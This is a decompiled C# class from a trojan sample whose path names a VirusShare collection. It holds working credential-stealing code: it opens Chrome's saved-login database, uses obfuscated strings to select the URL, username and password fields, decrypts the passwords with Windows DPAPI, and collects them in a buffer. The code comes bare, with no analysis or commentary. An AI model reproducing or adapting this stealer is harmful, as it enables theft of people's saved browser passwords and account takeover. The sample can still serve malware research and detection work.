// Decompiled with JetBrains decompiler
// Type: DAChrome
// Assembly: Script Master v7, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: C455AE42-10CE-458F-A8B3-AF5A9B9CC8DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eeafb61ec37b2a763da8693f22cd1ef63e43485408848c106d517b546e13c487.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class DAChrome
{
  public static string cPass;

  public static void GTCHRME()
  {
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + GOSLWHR.WHJBIYT("jZPGzbedsbOhuKO7xMOshr+80HB1rcu/rHWxvb/FncCzqr+YtcV+lJLAuBg=", "False");
    try
    {
      SQLiteHandler sqLiteHandler = new SQLiteHandler(str1);
      SQLiteHandler.REDTBLE(GOSLWHR.WHJBIYT("l7W4wbieHA==", "False"));
      if (!File.Exists(str1))
        return;
      int num = checked (SQLiteHandler.GetRowCount() - 1);
      int row_num = 0;
      while (row_num <= num)
      {
        string str2 = SQLiteHandler.GetValue(row_num, GOSLWHR.WHJBIYT("jautsqaMmLm9qSg=", "False"));
        string Left1 = SQLiteHandler.GetValue(row_num, GOSLWHR.WHJBIYT("nre0yLaKsbS1voqwxLsh", "False"));
        string Left2 = DAChrome.Decrypt(Encoding.Default.GetBytes(SQLiteHandler.GetValue(row_num, GOSLWHR.WHJBIYT("oa3K0cegvru9xpK4zMMZ", "False"))));
        if (Operators.CompareString(Left1, "", false) != 0 & Operators.CompareString(Left2, "", false) != 0)
        {
          DAChrome.cPass = GOSLWHR.WHJBIYT("gZynrqCBnKeuoIGcrdnVs8zPrqCBnKeuoIGcp66ggZwE", "False") + "\r\n" + GOSLWHR.WHJBIYT("fL7N1Y1UEw==", "False") + str2 + "\r\n" + GOSLWHR.WHJBIYT("eLGuwrCEq66KYiM=", "False") + Left1 + "\r\n" + GOSLWHR.WHJBIYT("eqbDysCZt7SRaRw=", "False") + Left2 + "\r\n" + GOSLWHR.WHJBIYT("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZQg", "False") + "\r\n ";
          NTUIYURW.NOMBKE += DAChrome.cPass;
        }
        checked { ++row_num; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern bool CryptUnprotectData(
    ref DAChrome.DATA_BLOB pDataIn,
    string szDataDescr,
    ref DAChrome.DATA_BLOB pOptionalEntropy,
    IntPtr pvReserved,
    ref DAChrome.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
    int dwFlags,
    ref DAChrome.DATA_BLOB pDataOut);

  public static string Decrypt(byte[] Datas)
  {
    DAChrome.DATA_BLOB dataBlob1 = new DAChrome.DATA_BLOB();
    DAChrome.DATA_BLOB dataBlob2 = new DAChrome.DATA_BLOB();
    GCHandle gcHandle = GCHandle.Alloc((object) Datas, GCHandleType.Pinned);
    dataBlob1.pbData = gcHandle.AddrOfPinnedObject();
    dataBlob1.cbData = Datas.Length;
    gcHandle.Free();
    ref DAChrome.DATA_BLOB local1 = ref dataBlob1;
    DAChrome.DATA_BLOB dataBlob3;
    DAChrome.DATA_BLOB dataBlob4 = dataBlob3;
    ref DAChrome.DATA_BLOB local2 = ref dataBlob4;
    IntPtr num;
    IntPtr pvReserved = num;
    DAChrome.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct1;
    DAChrome.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct2 = cryptprotectPromptstruct1;
    ref DAChrome.CRYPTPROTECT_PROMPTSTRUCT local3 = ref cryptprotectPromptstruct2;
    ref DAChrome.DATA_BLOB local4 = ref dataBlob2;
    DAChrome.CryptUnprotectData(ref local1, (string) null, ref local2, pvReserved, ref local3, 0, ref local4);
    byte[] numArray = new byte[checked (dataBlob2.cbData + 1)];
    Marshal.Copy(dataBlob2.pbData, numArray, 0, dataBlob2.cbData);
    string str = Encoding.Default.GetString(numArray);
    return str.Substring(0, checked (str.Length - 1));
  }

  [Flags]
  public enum CryptProtectPromptFlags
  {
    CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
    CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct CRYPTPROTECT_PROMPTSTRUCT
  {
    public int cbSize;
    public DAChrome.CryptProtectPromptFlags dwPromptFlags;
    public IntPtr hwndApp;
    public string szPrompt;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct DATA_BLOB
  {
    public int cbData;
    public IntPtr pbData;
  }
}
